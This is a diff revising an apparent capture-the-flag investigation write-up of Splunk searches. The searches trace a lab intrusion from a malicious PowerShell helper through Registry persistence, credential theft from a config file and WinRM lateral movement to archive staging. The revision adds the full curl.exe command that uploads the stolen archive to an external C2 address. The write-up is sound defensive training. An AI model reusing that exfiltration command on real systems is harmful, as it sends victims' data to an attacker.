@@ -1,11 +1,12 @@
-
 # Splunk Queries: Quiet as the Grave
 
-The investigation used Splunk to correlate process execution, network connections, persistence, credential access, lateral movement, discovery, and attempted exfiltration. Searches are organized by investigative progression. All timestamps are UTC.
+This file contains the Splunk searches I used to investigate suspicious activity in the TryHatMe Studios environment. I've organized them around the main findings, showing how the evidence connects from the first PowerShell execution to the attempted data exfiltration.
 
-## 1. Initial Execution
+All timestamps are in UTC.
 
-Identify the suspicious review helper and its process ancestry.
+## 1. Initial PowerShell Execution
+
+I started with process creation events on `THM-SREYES`, focusing on the NeuralNexus review helper.
 
 ```spl
 ComputerName="THM-SREYES" EventCode=1 "NeuralNexusReview"
@@ -13,11 +14,11 @@ ComputerName="THM-SREYES" EventCode=1 "NeuralNexusReview"
 | sort _time
 ```
 
-**Finding:** At 12:29:48, `explorer.exe` launched PowerShell to execute `review-helper.ps1` from the user's Downloads directory.
+**Finding:** At 12:29:48, `explorer.exe` launched PowerShell to run `review-helper.ps1` from the user's Downloads folder.
 
-## 2. Command-and-Control Connections
+## 2. C2 Communication
 
-Having identified the suspicious PowerShell process, examine outbound connections to its external destination.
+The suspicious PowerShell activity was associated with an external IP address, `45.147.230.131`. I checked the network events to establish which process was responsible for the connections.
 
 ```spl
 ComputerName="THM-SREYES" EventCode=3 DestinationIp="45.147.230.131"
@@ -26,11 +27,11 @@ ComputerName="THM-SREYES" EventCode=3 DestinationIp="45.147.230.131"
 | head 10
 ```
 
-**Finding:** PowerShell connected to `45.147.230.131:8443`. Process GUID correlation linked the connection to the malicious helper.
+**Finding:** The PowerShell process connected to `45.147.230.131:8443` shortly after execution. The process GUID matched the malicious helper.
 
 ## 3. Persistence
 
-Search for Registry modifications associated with the helper.
+Next, I checked whether the script had established a way to run again after the initial execution.
 
 ```spl
 ComputerName="THM-SREYES" "NeuralNexusReview"
@@ -39,9 +40,9 @@ ComputerName="THM-SREYES" "NeuralNexusReview"
 | sort _time
 ```
 
-**Finding:** At 12:37:20, the process configured the `NeuralNexusReview` Run value to execute a copy of the script from AppData.
+**Finding:** At 12:37:20, the script configured a Registry Run value named `NeuralNexusReview`, pointing to a PowerShell script under AppData.
 
-Verify that the persisted copy subsequently executed.
+I then checked process creation events for the same script.
 
 ```spl
 ComputerName="THM-SREYES" EventCode=1 "review-helper.ps1"
@@ -49,11 +50,11 @@ ComputerName="THM-SREYES" EventCode=1 "review-helper.ps1"
 | sort _time
 ```
 
-**Finding:** At 12:44:04, `explorer.exe` launched the AppData copy under a new logon session.
+**Finding:** At 12:44:04, `explorer.exe` launched the AppData copy in a new logon session. The persistence mechanism was active.
 
 ## 4. Credential Access
 
-Continue examining PowerShell activity for credential-bearing project configuration files.
+PowerShell script-block logging provided another important lead: the deployment configuration file `deploy-settings.json`.
 
 ```spl
 "deploy-settings.json"
@@ -61,15 +62,21 @@ Continue examining PowerShell activity for credential-bearing project configurat
 | sort _time
 ```
 
-**Finding:** At 13:01:41, PowerShell Event ID 4104 recorded `Get-Content`, `ConvertFrom-Json`, and `[PSCredential]` construction using the deployment configuration. Later authentication as `svc-studioops` supported the credential-access assessment.
+**Finding:** At 13:01:41, a script block showed `Get-Content` and `ConvertFrom-Json` being used to load the configuration file. The script then constructed a `[PSCredential]` object from its username and password fields.
 
-## 5. Lateral Movement and IT Inventory
+This was significant because the `svc-studioops` account appeared in the later remote authentication activity.
 
-Trace the service account through WinRM authentication and remote execution.
+## 5. Movement to the IT Workstation
 
-**Correlated evidence:** Event ID 4624 and Sysmon Event ID 1 established access to `THM-LSULLIVAN` at 13:16:42. The remote `wsmprovhost.exe` process launched `cmd.exe /c dir C:\ProgramData\StudioOps`.
+The authentication and process logs showed the `svc-studioops` account being used to access `THM-LSULLIVAN` through WinRM at 13:16:42.
 
-Examine subsequent PowerShell activity involving the IT support files.
+On the destination workstation, `wsmprovhost.exe` launched:
+
+```cmd
+cmd.exe /c dir C:\ProgramData\StudioOps
+```
+
+The directory was worth investigating further because it contained IT support material.
 
 ```spl
 "StudioOps" ("csv" OR "Get-Content" OR "Import-Csv" OR "Copy-Item")
@@ -77,11 +84,11 @@ Examine subsequent PowerShell activity involving the IT support files.
 | sort _time
 ```
 
-**Finding:** At 13:36:43, an `Invoke-Command` script block targeted `endpoint-list.csv` and `maintenance-runbook.txt` through a remote session.
+**Finding:** At 13:36:43, a PowerShell script block recorded commands targeting `endpoint-list.csv` and `maintenance-runbook.txt` through a remote session.
 
-## 6. Domain Controller and Marketing Workstation
+## 6. Attempted Access to DC-01
 
-Investigate explicit credential use toward the domain controller.
+The same service account was also involved in activity directed at the domain controller.
 
 ```spl
 ComputerName="THM-LSULLIVAN" EventCode=4648 "DC-01"
@@ -89,9 +96,11 @@ ComputerName="THM-LSULLIVAN" EventCode=4648 "DC-01"
 | sort _time
 ```
 
-**Finding:** At 13:48:25, credentials were supplied toward `HTTP/DC-01`. Network authentication succeeded, but remote command execution was not established.
+**Finding:** At 13:48:25, `wsmprovhost.exe` supplied credentials to `HTTP/DC-01`. Windows logged a successful network authentication, although the available process events did not show remote command execution on DC-01.
 
-Follow the activity to the Marketing workstation.
+## 7. Movement to the Marketing Workstation
+
+The next confirmed remote execution activity involved `THM-MSMITH`. I searched for the Marketing release directory in process creation events.
 
 ```spl
 ComputerName="THM-MSMITH" EventCode=1 "approved-release"
@@ -99,11 +108,17 @@ ComputerName="THM-MSMITH" EventCode=1 "approved-release"
 | sort _time
 ```
 
-**Finding:** At 15:03:37, WinRM-associated execution targeted `C:\StudioMarketing\approved-release` under `svc-studioops`.
+**Finding:** At 15:03:37, a WinRM session under `svc-studioops` executed:
 
-## 7. Post-Compromise Discovery
+```cmd
+cmd.exe /c dir C:\StudioMarketing\approved-release
+```
 
-Examine administrative enumeration on the Marketing workstation.
+This put the attacker on the workstation containing the Marketing release materials.
+
+## 8. Local Discovery
+
+I also examined the administrative commands executed through the remote session on `THM-MSMITH`.
 
 ```spl
 ComputerName="THM-MSMITH" EventCode=1 "Administrators"
@@ -111,11 +126,13 @@ ComputerName="THM-MSMITH" EventCode=1 "Administrators"
 | sort _time
 ```
 
-**Finding:** At 16:03:38, `wsmprovhost.exe` launched `net.exe localgroup Administrators`, which subsequently spawned `net1.exe`. Related evidence also identified `net user` and `net share` commands.
+**Finding:** At 16:03:38, `wsmprovhost.exe` spawned `net.exe localgroup Administrators`, followed by `net1.exe`. Other process events showed `net user` and `net share`.
 
-## 8. Collection and Archive Preparation
+Together, these commands point to local account, administrator group, and network share enumeration.
 
-Search PowerShell script blocks for the staging directory.
+## 9. File Collection and Archiving
+
+The focus then returned to `THM-SREYES`, where PowerShell activity involved staging files from the Marketing workstation and the NeuralNexus project directory.
 
 ```spl
 ComputerName="THM-SREYES" EventCode=4104 "review-staging"
@@ -123,11 +140,16 @@ ComputerName="THM-SREYES" EventCode=4104 "review-staging"
 | sort _time
 ```
 
-**Finding:** At 16:27:01, commands targeted Marketing release materials and NeuralNexus project files for collection. At 16:27:28, `Compress-Archive` targeted `$env:TEMP\review-cache.zip`.
+**Finding:** Two script blocks captured the collection sequence:
 
-## 9. Attempted Exfiltration
+- **16:27:01:** Commands to create staging directories and copy Marketing release files and NeuralNexus project materials.
+- **16:27:28:** `Compress-Archive` targeting the staged files and an archive named `review-cache.zip`.
 
-Trace the archive name to process execution and its destination.
+The archive name was the link to the final part of the attack chain.
+
+## 10. Attempted Exfiltration
+
+I searched for `review-cache.zip` in process creation events to see what happened after the archive preparation.
 
 ```spl
 ComputerName="THM-SREYES" EventCode=1 "review-cache.zip"
@@ -135,10 +157,18 @@ ComputerName="THM-SREYES" EventCode=1 "review-cache.zip"
 | sort _time
 ```
 
-**Finding:** At 16:27:54, `curl.exe` executed beneath the persisted PowerShell process with `--upload-file`, targeting `https://45.147.230.131:8443/ingest/review-cache.zip`.
+**Finding:** At 16:27:54, `curl.exe` ran as a child of the persisted PowerShell process and attempted to upload the archive to the external C2 endpoint.
 
-**Evidence limitation:** The upload command is confirmed; successful remote receipt was not independently verified.
+```cmd
+curl.exe --fail --show-error --insecure --upload-file C:\Users\S460E~1.REY\AppData\Local\Temp\review-cache.zip https://45.147.230.131:8443/ingest/review-cache.zip
+```
+
+The process relationship connected the attempted upload directly to the malicious PowerShell helper identified earlier.
 
 ## Conclusion
 
-Correlating Sysmon, Windows Security events, and PowerShell script blocks reconstructed the intrusion from initial execution through persistence, credential access, WinRM lateral movement, discovery, collection, and attempted exfiltration.
+The searches brought together several types of evidence: Sysmon process and network events, Windows authentication logs, Registry changes, and PowerShell script blocks.
+
+The resulting timeline showed how the attacker moved from an initial PowerShell foothold to persistence, credential access, lateral movement, discovery, file staging, and attempted exfiltration.
+
+The most useful part of the investigation was correlating events across different hosts and log sources. Individual commands provided clues, but their relationships established the attack chain.
